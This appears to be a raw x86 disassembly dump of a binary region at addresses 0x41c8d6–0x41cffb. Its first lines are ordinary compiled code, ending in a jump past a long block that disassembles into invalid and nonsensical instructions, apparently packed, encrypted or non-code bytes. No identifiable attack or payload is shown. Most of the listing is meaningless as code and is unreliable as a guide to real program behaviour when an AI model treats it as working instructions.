  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	ja     0x41c952
  41c93d:	jg     0x41c8ef
  41c93f:	out    dx,eax
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0x48181812
  41c948:	jmp    0x699d:0x92982fb9
  41c94f:	mov    eax,0x7d73cacd
  41c954:	aam    0x7a
  41c956:	push   ds
  41c957:	sbb    eax,DWORD PTR [ecx]
  41c959:	(bad)  
  41c95a:	in     al,0xd
  41c95c:	test   BYTE PTR [edx+0x44fb3a9],0xd8
  41c963:	cwde   
  41c964:	add    eax,0x31dfee2b
  41c969:	mov    ah,0xaf
  41c96b:	dec    edi
  41c96c:	jnp    0x41c8ee
  41c96e:	sbb    DWORD PTR [edx+edx*1-0x13],esp
  41c972:	xchg   edx,eax
  41c973:	(bad)  
  41c975:	sub    bl,0x53
  41c978:	out    dx,al
  41c979:	pop    eax
  41c97a:	push   ss
  41c97b:	sbb    al,0x9c
  41c97d:	test   BYTE PTR [ecx],dh
  41c97f:	cli    
  41c980:	dec    edx
  41c981:	mov    ecx,0xb85a4526
  41c986:	fidiv  DWORD PTR [ebp+eiz*1-0x3c]
  41c98a:	call   0x92128203
  41c98f:	pop    ecx
  41c990:	mov    eax,ds:0x5b24ff6d
  41c995:	scas   eax,DWORD PTR es:[edi]
  41c996:	cmp    DWORD PTR [ebx+0x53de9452],ebp
  41c99c:	cdq    
  41c99d:	rcr    DWORD PTR [edx],cl
  41c99f:	nop
  41c9a0:	xchg   ebp,eax
  41c9a1:	popa   
  41c9a2:	jg     0x41c9ee
  41c9a4:	cli    
  41c9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a6:	push   edx
  41c9a7:	loope  0x41c995
  41c9a9:	jp     0x41c9cd
  41c9ab:	jae    0x41c9af
  41c9ad:	sti    
  41c9ae:	lahf   
  41c9af:	jp     0x41c99b
  41c9b1:	hlt    
  41c9b2:	sub    ebx,DWORD PTR [ecx+0x27]
  41c9b5:	int    0xf2
  41c9b7:	mov    bh,0xe5
  41c9b9:	leave  
  41c9ba:	and    BYTE PTR [ebx-0xd396225],bh
  41c9c0:	xchg   DWORD PTR [ebp+0x0],esi
  41c9c3:	(bad)  
  41c9c4:	loop   0x41c9d3
  41c9c6:	jns    0x41c9a3
  41c9c8:	cmp    al,bl
  41c9ca:	scas   al,BYTE PTR es:[edi]
  41c9cb:	cdq    
  41c9cc:	mov    bh,0xcf
  41c9ce:	fucom  st(7)
  41c9d0:	scas   al,BYTE PTR es:[edi]
  41c9d1:	pop    ecx
  41c9d2:	add    dl,BYTE PTR [esi+0x2b]
  41c9d5:	jmp    DWORD PTR [edx]
  41c9d7:	push   0xffffffb6
  41c9d9:	xor    ecx,edx
  41c9db:	lock sbb cl,ah
  41c9de:	push   edi
  41c9df:	xchg   esi,eax
  41c9e0:	fmul   DWORD PTR [edx+0x5b]
  41c9e3:	xor    esi,edx
  41c9e5:	arpl   sp,bx
  41c9e7:	dec    esi
  41c9e8:	pushf  
  41c9e9:	adc    bl,BYTE PTR [ebp+0x4d7e534b]
  41c9ef:	jb     0x41ca24
  41c9f1:	ret    0xe5cd
  41c9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9f5:	ds call 0xcd49:0xbd20bc1d
  41c9fd:	mov    ebp,0x844995db
  41ca02:	jae    0x41ca4a
  41ca04:	xor    edx,DWORD PTR [ebp+0x75]
  41ca07:	mov    BYTE PTR [eax-0x365147cb],ah
  41ca0d:	adc    BYTE PTR [eax-0x5bd2894c],bh
  41ca13:	sahf   
  41ca14:	or     al,0xfe
  41ca16:	js     0x41c9c7
  41ca18:	lahf   
  41ca19:	stc    
  41ca1a:	push   ss
  41ca1b:	or     edx,DWORD PTR [esi+0x2]
  41ca1e:	(bad)  
  41ca1f:	push   ebp
  41ca20:	inc    ecx
  41ca21:	and    edx,DWORD PTR [ebx]
  41ca23:	xchg   edi,eax
  41ca24:	mov    edx,0x94f789ae
  41ca29:	data16 (bad) 
  41ca2b:	add    edi,DWORD PTR [ebx]
  41ca2d:	enter  0x1334,0xa2
  41ca31:	push   ss
  41ca32:	ins    BYTE PTR es:[edi],dx
  41ca33:	jbe    0x41ca85
  41ca35:	adc    eax,0x77890045
  41ca3a:	mov    esp,0xf2ddbc99
  41ca3f:	(bad)
  41ca42:	daa    
  41ca43:	cmp    ebx,DWORD PTR [ecx]
  41ca45:	xchg   ebp,eax
  41ca46:	adc    ebx,esp
  41ca48:	mov    bl,0x61
  41ca4a:	inc    edi
  41ca4b:	aam    0x85
  41ca4d:	cmp    eax,0x19d9d0e3
  41ca52:	sar    DWORD PTR [edi+0x17933e52],cl
  41ca58:	and    al,0x31
  41ca5a:	pop    ebx
  41ca5b:	sbb    eax,DWORD PTR [esi-0x40]
  41ca5e:	int3   
  41ca5f:	jbe    0x41cadf
  41ca61:	sub    eax,0xe3f5e4ec
  41ca66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca67:	in     al,0x4f
  41ca69:	stos   BYTE PTR es:[edi],al
  41ca6a:	add    eax,0x472a4860
  41ca6f:	aaa    
  41ca70:	icebp  
  41ca71:	div    BYTE PTR [esi]
  41ca73:	fadd   QWORD PTR [ebx+0x1f60f7bc]
  41ca79:	cli    
  41ca7a:	mov    eax,ds:0x76866a64
  41ca80:	mov    cl,0xbb
  41ca82:	push   es
  41ca83:	popa   
  41ca84:	ds pop ss
  41ca86:	leave  
  41ca87:	retf   0x727e
  41ca8a:	popa   
  41ca8b:	bound  esp,QWORD PTR [ebx+0x5e40f8c3]
  41ca91:	test   DWORD PTR [ebx+0x4d],edi
  41ca94:	inc    ebx
  41ca95:	xor    eax,0x2985dd71
  41ca9a:	push   cs
  41ca9b:	outs   dx,BYTE PTR ds:[esi]
  41ca9c:	and    BYTE PTR [ecx+0x70],al
  41ca9f:	aas    
  41caa0:	sub    DWORD PTR [edi+0x3d],ebp
  41caa3:	mov    dl,0x23
  41caa5:	nop
  41caa6:	ror    al,1
  41caa8:	mov    ah,0xec
  41caaa:	inc    eax
  41caab:	(bad)  [ebx-0x16]
  41caae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caaf:	out    0x58,al
  41cab1:	jecxz  0x41ca33
  41cab3:	jno    0x41caca
  41cab5:	dec    esi
  41cab6:	das    
  41cab7:	jmp    0x49f97a35
  41cabc:	or     eax,0xadf1c015
  41cac1:	arpl   WORD PTR [esi],bp
  41cac3:	mov    ds,ebx
  41cac5:	cmp    al,0xda
  41cac7:	lea    ebp,[ecx+0x23]
  41caca:	clc    
  41cacb:	inc    esp
  41cacc:	aaa    
  41cacd:	inc    edx
  41cace:	ret    
  41cacf:	push   ss
  41cad0:	dec    eax
  41cad1:	xchg   DWORD PTR [eax+0x36a003b5],esi
  41cad7:	xor    al,0x45
  41cad9:	sbb    edx,0xe631612c
  41cadf:	int    0x52
  41cae1:	and    al,0xc6
  41cae3:	cmp    BYTE PTR [ecx],0x33
  41cae6:	or     dl,0xf5
  41cae9:	add    ah,dl
  41caeb:	jo     0x41cb33
  41caed:	jmp    0x41cb4b
  41caef:	push   esi
  41caf0:	into   
  41caf1:	xor    DWORD PTR [ecx+0x74],eax
  41caf4:	push   0x8e42cb1c
  41caf9:	data16 adc al,0x76
  41cafc:	popf   
  41cafd:	push   cs
  41cafe:	inc    ebx
  41caff:	(bad)  
  41cb00:	test   al,0xd7
  41cb02:	mov    bl,0x11
  41cb04:	mov    eax,0x43c4b9b6
  41cb09:	pop    ebp
  41cb0a:	xor    BYTE PTR [edx],0xec
  41cb0d:	lds    edi,FWORD PTR [ebx+0x2995d3bb]
  41cb13:	lods   eax,DWORD PTR ds:[esi]
  41cb14:	out    0xc3,al
  41cb16:	in     eax,dx
  41cb17:	and    DWORD PTR [esi+edi*8-0xe],0x2661505
  41cb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb21:	out    0x87,eax
  41cb23:	jecxz  0x41cacc
  41cb25:	pop    esi
  41cb26:	sub    al,BYTE PTR [ebp+0x2ddfd03b]
  41cb2c:	sub    bh,BYTE PTR [esi+0x4d0c270a]
  41cb32:	aad    0xdf
  41cb34:	add    al,0x14
  41cb36:	mov    WORD PTR [eax+0x7b7ffae4],fs
  41cb3c:	test   al,0x64
  41cb3e:	xchg   edi,eax
  41cb3f:	mov    WORD PTR [eax+eax*4+0x62e3da13],cs
  41cb46:	sub    BYTE PTR [ecx],ah
  41cb48:	shl    edx,0x54
  41cb4b:	scas   eax,DWORD PTR es:[edi]
  41cb4c:	mov    cl,BYTE PTR [edi-0x48]
  41cb4f:	fsubr  DWORD PTR [esi+0x30]
  41cb52:	ret    
  41cb53:	jb     0x41cbd4
  41cb55:	add    ebp,DWORD PTR [eax+eiz*4]
  41cb58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb5a:	mov    ch,0xcd
  41cb5c:	adc    BYTE PTR [ebx+eiz*8],bh
  41cb5f:	ss jecxz 0x41cb43
  41cb62:	xchg   edi,eax
  41cb63:	call   FWORD PTR [eax-0x49]
  41cb66:	repnz pop ds
  41cb68:	cmp    DWORD PTR [esi],esp
  41cb6a:	jo     0x41cb29
  41cb6c:	enter  0x7668,0xe7
  41cb70:	inc    esi
  41cb71:	mov    BYTE PTR [edi+0x4a],bl
  41cb74:	mov    ebx,0x8124d3a4
  41cb79:	or     BYTE PTR [eax+0x5a],ah
  41cb7c:	jl     0x41cb88
  41cb7e:	popa   
  41cb7f:	lods   al,BYTE PTR ds:[esi]
  41cb80:	fwait
  41cb81:	mov    dh,0xa6
  41cb83:	fidiv  WORD PTR [edi]
  41cb85:	ins    DWORD PTR es:[edi],dx
  41cb86:	lds    edx,FWORD PTR [eax+0x57904715]
  41cb8c:	shr    DWORD PTR [ebx-0x28],0x20
  41cb90:	(bad)  
  41cb92:	mov    WORD PTR [edi-0x591782],?
  41cb98:	or     bl,BYTE PTR [edx]
  41cb9a:	imul   edx,DWORD PTR [esi+0x79d9cbb4],0x58442fe4
  41cba4:	ret    
  41cba5:	pop    ds
  41cba6:	out    0xbc,eax
  41cba8:	and    eax,0xa82f738f
  41cbad:	and    al,BYTE PTR [edi]
  41cbaf:	ins    DWORD PTR es:[edi],dx
  41cbb0:	int    0x52
  41cbb2:	sti    
  41cbb3:	adc    edx,DWORD PTR [ebp-0x54750ab1]
  41cbb9:	push   esi
  41cbba:	cwde   
  41cbbb:	lds    edi,FWORD PTR [ebp+0x68]
  41cbbe:	pop    esp
  41cbbf:	jecxz  0x41cbc6
  41cbc1:	daa    
  41cbc2:	sahf   
  41cbc3:	fldenv [ebx]
  41cbc5:	in     eax,dx
  41cbc6:	lods   al,BYTE PTR ds:[esi]
  41cbc7:	ins    BYTE PTR es:[edi],dx
  41cbc8:	push   ss
  41cbc9:	inc    ebx
  41cbca:	push   edx
  41cbcb:	sub    DWORD PTR [ebp+0x4ae1b7ab],0xacee6f73
  41cbd5:	xchg   BYTE PTR [ebp+0x25],cl
  41cbd8:	xchg   edx,eax
  41cbd9:	sub    BYTE PTR ds:0x4f6fb7e,bl
  41cbdf:	cld    
  41cbe0:	cs mov edi,0x27476d1e
  41cbe6:	sbb    DWORD PTR [esi+0x1ab516c7],eax
  41cbec:	nop
  41cbed:	dec    ebx
  41cbee:	fwait
  41cbef:	adc    DWORD PTR [eax],eax
  41cbf1:	jmp    0x24ebbb97
  41cbf6:	inc    esp
  41cbf7:	int3   
  41cbf8:	adc    DWORD PTR [ecx],edx
  41cbfa:	(bad)  
  41cbfb:	cmc    
  41cbfc:	and    dl,BYTE PTR [esi-0x71]
  41cbff:	mov    eax,0x3587012b
  41cc04:	or     al,0x1d
  41cc06:	dec    ebx
  41cc07:	test   al,0x46
  41cc09:	push   eax
  41cc0a:	(bad)  
  41cc0b:	xchg   ecx,eax
  41cc0c:	cld    
  41cc0d:	adc    eax,0xcc136fbc
  41cc12:	jmp    ebp
  41cc14:	jo     0x41cc7a
  41cc16:	pop    ebx
  41cc17:	cmp    ch,BYTE PTR [ecx]
  41cc19:	nop
  41cc1a:	not    DWORD PTR [edi+0xaa7cd96]
  41cc20:	mov    cl,0xf1
  41cc22:	mov    bh,0x2b
  41cc24:	sti    
  41cc25:	jle    0x41cbd9
  41cc27:	pop    ebp
  41cc28:	fwait
  41cc29:	mov    ecx,0xbffd919b
  41cc2e:	popf   
  41cc2f:	cdq    
  41cc30:	mov    dh,0x97
  41cc32:	mov    WORD PTR [ecx+0x5d],?
  41cc35:	pop    edx
  41cc36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc37:	iret   
  41cc38:	and    DWORD PTR [edx-0x2322fdcf],ebx
  41cc3e:	adc    ebp,DWORD PTR ds:[edi+esi*2+0x5a]
  41cc43:	aad    0x60
  41cc45:	add    cl,bl
  41cc47:	sub    bl,dl
  41cc49:	stos   BYTE PTR es:[edi],al
  41cc4a:	xor    cl,0x3c
  41cc4d:	pop    ss
  41cc4e:	add    ah,BYTE PTR [ecx-0x29]
  41cc51:	inc    esp
  41cc52:	mov    WORD PTR [esi+0x180de6e6],ss
  41cc58:	rcl    BYTE PTR [ebx-0x49],cl
  41cc5b:	add    BYTE PTR [esi+edx*8-0x2c],bl
  41cc5f:	sbb    eax,0xb055e6d2
  41cc64:	in     eax,0x2e
  41cc66:	ins    DWORD PTR es:[edi],dx
  41cc67:	pop    ss
  41cc68:	call   0xcc0d:0xeee5e58c
  41cc6f:	int3   
  41cc70:	jmp    0xa0fd2936
  41cc75:	fadd   QWORD PTR [eax+0x72]
  41cc78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc79:	rcl    BYTE PTR [ecx+0x64],cl
  41cc7c:	bound  edx,QWORD PTR [esi-0x5c]
  41cc7f:	jae    0x41cc1d
  41cc81:	push   ebp
  41cc82:	mov    dl,0xad
  41cc84:	pusha  
  41cc85:	dec    ecx
  41cc86:	mov    eax,ds:0xc5f63f62
  41cc8b:	push   eax
  41cc8c:	cmc    
  41cc8d:	mov    cl,0x60
  41cc8f:	sbb    esi,DWORD PTR [eax+0x22]
  41cc92:	pop    ss
  41cc93:	cmp    ebx,DWORD PTR [ebx-0x7f]
  41cc96:	stos   DWORD PTR es:[edi],eax
  41cc97:	loopne 0x41cc54
  41cc99:	dec    esi
  41cc9a:	inc    esi
  41cc9b:	xchg   esp,eax
  41cc9c:	push   edi
  41cc9d:	mov    eax,0x770f617b
  41cca2:	pushf  
  41cca3:	fst    DWORD PTR [eax]
  41cca5:	loop   0x41cc73
  41cca7:	(bad)  
  41cca8:	iret   
  41cca9:	test   DWORD PTR [ebp-0x79],ebp
  41ccac:	mov    al,ds:0x6b916d26
  41ccb1:	inc    esp
  41ccb2:	push   es
  41ccb3:	retf   0x4bc9
  41ccb6:	daa    
  41ccb7:	or     al,0x65
  41ccb9:	stos   DWORD PTR es:[edi],eax
  41ccba:	ja     0x41cd18
  41ccbc:	icebp  
  41ccbd:	mov    ds:0xbe473a58,eax
  41ccc2:	mov    ah,0x2e
  41ccc4:	jecxz  0x41cc7c
  41ccc6:	std    
  41ccc7:	aam    0x3e
  41ccc9:	push   ecx
  41ccca:	jmp    0xb796:0x4d58d78c
  41ccd1:	xor    eax,0x6203607b
  41ccd6:	dec    ebx
  41ccd7:	mov    eax,ds:0x8df220d
  41ccdc:	add    al,0xaa
  41ccde:	hlt    
  41ccdf:	sub    dh,ah
  41cce1:	push   edx
  41cce2:	popa   
  41cce3:	mov    esp,ebp
  41cce5:	or     BYTE PTR [eax-0x5dee3de9],bl
  41cceb:	lds    edx,FWORD PTR [ebx+esi*8+0x76]
  41ccef:	mov    cl,0x15
  41ccf1:	mov    al,ds:0x362ca212
  41ccf6:	sbb    al,0x5d
  41ccf8:	ror    DWORD PTR [edx+0xc3c244c],0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xaae36970
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x1e201818],bh
  41cd1e:	inc    ebx
  41cd1f:	sub    ebp,edi
  41cd21:	dec    edx
  41cd22:	adc    BYTE PTR [edx+0x48],al
  41cd25:	loope  0x41ccd0
  41cd27:	sar    DWORD PTR [edx+0x70],0x20
  41cd2b:	pop    ss
  41cd2c:	jns    0x41ccd7
  41cd2e:	ror    ebp,0x37
  41cd31:	out    dx,al
  41cd32:	dec    esi
  41cd33:	cmp    DWORD PTR [ebx],edi
  41cd35:	lods   al,BYTE PTR ds:[esi]
  41cd36:	jo     0x41cd00
  41cd38:	mov    edi,0xf4d25769
  41cd3d:	cwde   
  41cd3e:	mov    ah,0x3c
  41cd40:	scas   al,BYTE PTR es:[edi]
  41cd41:	fs pusha 
  41cd43:	fcom   st(1)
  41cd45:	mov    cx,0xbbc0
  41cd49:	lar    ecx,cx
  41cd4c:	inc    ecx
  41cd4d:	add    bh,BYTE PTR [edx+edx*2+0x6e29ebe5]
  41cd54:	sub    BYTE PTR [eax-0x11],ah
  41cd57:	xor    al,0x8c
  41cd59:	cmp    al,0x99
  41cd5b:	mov    esp,0xe6b80313
  41cd60:	jge    0x41cd38
  41cd62:	xchg   edi,eax
  41cd63:	jo     0x41cd3c
  41cd65:	(bad)  
  41cd66:	ins    DWORD PTR es:[edi],dx
  41cd67:	cmp    BYTE PTR [edi+0x23f7e417],al
  41cd6d:	arpl   WORD PTR [eax+0x1dd466b8],dx
  41cd73:	mov    esi,0x4435c945
  41cd78:	or     cl,BYTE PTR [ebx]
  41cd7a:	scas   eax,DWORD PTR es:[edi]
  41cd7b:	adc    eax,0xb30b6913
  41cd80:	mov    ebx,0x94b41f71
  41cd85:	inc    ecx
  41cd86:	dec    ebx
  41cd87:	push   edx
  41cd88:	nop
  41cd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd8a:	pop    ebp
  41cd8c:	fnsave [edx]
  41cd8e:	lods   al,BYTE PTR ds:[esi]
  41cd8f:	arpl   WORD PTR [edi+0x7dffce27],ax
  41cd95:	cmp    ah,al
  41cd97:	scas   al,BYTE PTR es:[edi]
  41cd98:	push   ds
  41cd99:	test   BYTE PTR [esi+0xe],0x7e
  41cd9d:	mov    ecx,0xf7aff66e
  41cda2:	fs mov edi,0xe2138b3c
  41cda8:	sti    
  41cda9:	mov    ecx,0x87f18bbc
  41cdae:	ss js  0x41cd93
  41cdb1:	mov    ah,0x50
  41cdb3:	jl     0x41cd99
  41cdb5:	psadbw mm4,mm5
  41cdb8:	ror    esp,0x3d
  41cdbb:	in     eax,dx
  41cdbc:	jns    0x41cd62
  41cdbe:	cmp    edx,ebp
  41cdc0:	cmp    eax,DWORD PTR [ebp-0x45]
  41cdc3:	sbb    al,BYTE PTR [edx+0x2]
  41cdc6:	fidiv  WORD PTR [edi]
  41cdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc9:	xchg   ecx,eax
  41cdca:	push   es
  41cdcb:	sbb    ecx,DWORD PTR [eax+0x1253f3d4]
  41cdd1:	popf   
  41cdd2:	adc    eax,0x7c022c88
  41cdd7:	inc    esi
  41cdd8:	jae    0x41cdae
  41cdda:	fdiv   DWORD PTR [edi]
  41cddc:	add    ch,BYTE PTR [edx+ebp*2]
  41cddf:	xchg   esp,eax
  41cde0:	or     eax,0x13f1ccba
  41cde5:	adc    BYTE PTR [esi-0x4a2668af],dh
  41cdeb:	mov    al,ds:0x9b9e6a7e
  41cdf0:	inc    ebx
  41cdf1:	and    dl,al
  41cdf3:	mov    ds:0xa6a5c519,eax
  41cdf8:	mov    bh,0x4c
  41cdfa:	or     ebp,DWORD PTR [ecx+0xdd0f33c]
  41ce00:	(bad)  
  41ce01:	rol    ah,cl
  41ce03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce04:	(bad)  
  41ce05:	iret   
  41ce06:	retf   
  41ce07:	ss and eax,edx
  41ce0a:	jle    0x41cdb6
  41ce0c:	je     0x41ce69
  41ce0e:	pop    es
  41ce0f:	or     bh,BYTE PTR [edi]
  41ce11:	xlat   BYTE PTR ds:[ebx]
  41ce12:	jl     0x41ce2b
  41ce14:	idiv   ah
  41ce16:	rcl    eax,cl
  41ce18:	pusha  
  41ce19:	fcmovbe st,st(3)
  41ce1b:	outs   dx,DWORD PTR ds:[esi]
  41ce1c:	sbb    dh,BYTE PTR [edi-0x13c66e6a]
  41ce22:	sbb    ebp,DWORD PTR [ecx+0x26]
  41ce25:	mov    ebp,0x8e0940cb
  41ce2a:	pop    ebx
  41ce2b:	aad    0xf7
  41ce2d:	cmp    BYTE PTR [eax+eiz*1-0x49],0x81
  41ce32:	inc    ecx
  41ce33:	not    bh
  41ce35:	adc    edx,esi
  41ce37:	inc    esp
  41ce38:	clc    
  41ce39:	std    
  41ce3a:	xchg   edx,eax
  41ce3b:	push   eax
  41ce3c:	xchg   esi,eax
  41ce3d:	jmp    0xc601370e
  41ce42:	ret    
  41ce43:	xor    BYTE PTR [edx+0xd],cl
  41ce46:	(bad)  
  41ce47:	fwait
  41ce48:	repnz nop
  41ce4a:	jg     0x41ce09
  41ce4c:	shl    BYTE PTR ss:[ecx-0x5f],cl
  41ce50:	pushf  
  41ce51:	gs call 0x2a78:0x6c21dfc3
  41ce59:	sbb    eax,0x49491435
  41ce5e:	jns    0x41cdf4
  41ce60:	push   ebx
  41ce61:	shl    BYTE PTR [edi],1
  41ce63:	icebp  
  41ce64:	sub    bh,BYTE PTR [edx-0x550b339b]
  41ce6a:	or     DWORD PTR [edi+0x6f],0xffffffaa
  41ce6e:	into   
  41ce6f:	lea    ebp,[ecx-0x26]
  41ce72:	inc    eax
  41ce73:	add    BYTE PTR [ecx+0x4],0x2f
  41ce77:	iret   
  41ce78:	test   eax,0x6d196113
  41ce7d:	retf   
  41ce7e:	add    ebx,DWORD PTR [eax-0xd89d35b]
  41ce84:	ret    0x87b8
  41ce87:	add    al,0x14
  41ce89:	call   0xce707c57
  41ce8e:	push   cs
  41ce8f:	jp     0x41ceec
  41ce91:	push   esi
  41ce92:	not    DWORD PTR [ebp+0x2c]
  41ce95:	lock or DWORD PTR [edi+0x25],eax
  41ce99:	adc    DWORD PTR [ebx-0x765b67a1],ecx
  41ce9f:	xlat   BYTE PTR ds:[ebx]
  41cea0:	std    
  41cea1:	cwde   
  41cea2:	stos   BYTE PTR es:[edi],al
  41cea3:	mov    ds:0x72b4a0a3,al
  41cea8:	mov    al,0xc7
  41ceaa:	mov    DWORD PTR [ebp+0x65],eax
  41cead:	pop    edx
  41ceae:	mov    ebp,0xcac99e45
  41ceb3:	xchg   edi,eax
  41ceb4:	(bad)  
  41ceb5:	xlat   BYTE PTR ds:[ebx]
  41ceb6:	das    
  41ceb7:	fistp  DWORD PTR [edx]
  41ceb9:	cli    
  41ceba:	mov    ch,0x64
  41cebc:	fdivr  DWORD PTR [esi+0x79]
  41cebf:	mov    dh,0x30
  41cec1:	daa    
  41cec2:	dec    ecx
  41cec3:	or     al,0x8d
  41cec5:	lock call 0x4918:0x61494dae
  41cecd:	and    eax,0x7e7fee9b
  41ced2:	mov    BYTE PTR [eax],al
  41ced4:	ins    DWORD PTR es:[edi],dx
  41ced5:	add    BYTE PTR [eax+0x1cca4c66],dh
  41cedb:	lahf   
  41cedc:	adc    bh,BYTE PTR [eax+0x396373c9]
  41cee2:	std    
  41cee3:	pop    ebx
  41cee4:	sbb    eax,0x27b24f91
  41cee9:	loopne 0x41ce8a
  41ceeb:	data16 rcl BYTE PTR [edx+0x13b0e61a],cl
  41cef2:	push   edx
  41cef3:	cli    
  41cef4:	adc    BYTE PTR [eax],ah
  41cef6:	pop    ebp
  41cef7:	jmp    0xc1575bdd
  41cefc:	add    ch,BYTE PTR [eax+edx*2+0x34be5563]
  41cf03:	aaa    
  41cf04:	inc    ebp
  41cf05:	dec    eax
  41cf06:	not    DWORD PTR [edi]
  41cf08:	pop    eax
  41cf09:	inc    ebp
  41cf0a:	adc    edx,ebx
  41cf0c:	int    0xc8
  41cf0e:	or     al,0x92
  41cf10:	sub    ebx,esi
  41cf12:	jp     0x41cf70
  41cf14:	out    dx,al
  41cf15:	cld    
  41cf16:	cld    
  41cf17:	std    
  41cf18:	dec    edi
  41cf19:	inc    esi
  41cf1a:	and    BYTE PTR [edx+0x47ca1d8e],ch
  41cf20:	cmp    eax,0x45e3e7fc
  41cf25:	nop
  41cf26:	popa   
  41cf27:	adc    ebx,DWORD PTR [eax+0x59]
  41cf2a:	xchg   BYTE PTR [esi-0x49],dh
  41cf2d:	sub    ch,BYTE PTR [ecx+esi*2]
  41cf30:	push   0x95d22333
  41cf35:	lahf   
  41cf36:	iret   
  41cf37:	data16 sbb BYTE PTR fs:[ecx],dl
  41cf3b:	dec    eax
  41cf3c:	gs daa 
  41cf3e:	shl    BYTE PTR [ecx+ecx*4+0x6f],1
  41cf42:	pop    ebp
  41cf43:	xchg   esi,eax
  41cf44:	or     BYTE PTR [bp+di],0x45
  41cf48:	fsubp  st(0),st
  41cf4a:	stc    
  41cf4b:	lods   eax,DWORD PTR ds:[esi]
  41cf4c:	(bad)  [eax-0x1729110a]
  41cf52:	(bad)  
  41cf53:	(bad)  
  41cf55:	enter  0xa2a0,0x74
  41cf59:	pop    ebx
  41cf5a:	dec    ecx
  41cf5b:	icebp  
  41cf5c:	fbld   TBYTE PTR [esi+0x3e]
  41cf5f:	sub    eax,DWORD PTR ds:0xc53c3a80
  41cf65:	rcl    DWORD PTR [esp+eax*8],cl
  41cf68:	pop    ds
  41cf69:	push   ebx
  41cf6a:	dec    ecx
  41cf6b:	jecxz  0x41cf51
  41cf6d:	mov    ebx,0x4e37c17a
  41cf72:	fimul  DWORD PTR [ecx+0x62229623]
  41cf78:	dec    edi
  41cf79:	nop
  41cf7a:	fsubr  DWORD PTR [ebx+0x61]
  41cf7d:	adc    BYTE PTR [edx-0x55d25011],0x92
  41cf84:	pop    edx
  41cf85:	xor    DWORD PTR [ebx+0x69],ebp
  41cf88:	and    al,0x76
  41cf8a:	sbb    ah,BYTE PTR [eax+0x4acf8ddf]
  41cf90:	jl     0x41cf49
  41cf92:	jo     0x41d00a
  41cf94:	push   esp
  41cf95:	mov    ch,0xa8
  41cf97:	scas   al,BYTE PTR es:[edi]
  41cf98:	mov    edi,0x174eaa97
  41cf9d:	sub    dh,BYTE PTR [esi-0x4c]
  41cfa0:	jl     0x41cf80
  41cfa2:	or     bl,bl
  41cfa4:	sbb    DWORD PTR [edx+0x2f],esp
  41cfa7:	inc    esp
  41cfa8:	jns    0x41cfa1
  41cfaa:	shr    DWORD PTR [eax],cl
  41cfac:	xor    BYTE PTR [eax+0x3575b729],bl
  41cfb2:	pop    edx
  41cfb3:	mov    edi,0x4071a0fa
  41cfb8:	bound  eax,QWORD PTR [edi+eiz*4+0x39cc0606]
  41cfbf:	pop    eax
  41cfc0:	(bad)  
  41cfc1:	jge    0x41cf98
  41cfc3:	pop    edx
  41cfc4:	stos   BYTE PTR es:[edi],al
  41cfc5:	iret   
  41cfc6:	or     edi,DWORD PTR [edi]
  41cfc8:	cmp    cl,BYTE PTR [eax+0x2e]
  41cfcb:	mov    ah,0xb8
  41cfcd:	mov    bh,0x63
  41cfcf:	jnp    0x41cff0
  41cfd1:	and    eax,0x3d80656
  41cfd6:	repz cwde 
  41cfd8:	retf   
  41cfd9:	xchg   ebp,eax
  41cfda:	adc    al,0x18
  41cfdc:	dec    esp
  41cfdd:	lds    ebp,FWORD PTR [ecx+0x11bc66f5]
  41cfe3:	test   DWORD PTR [edi-0x26],edx
  41cfe6:	push   ecx
  41cfe7:	fisubr WORD PTR [ebp-0x55202fd]
  41cfed:	xchg   esp,eax
  41cfee:	add    al,0x30
  41cff0:	les    ecx,FWORD PTR [edx+ebx*8]
  41cff3:	xor    edx,DWORD PTR [ebp+0x13]
  41cff6:	jo     0x41cfdc
  41cff8:	iret   
  41cff9:	aas    
  41cffa:	in     al,dx
  41cffb:	push   es
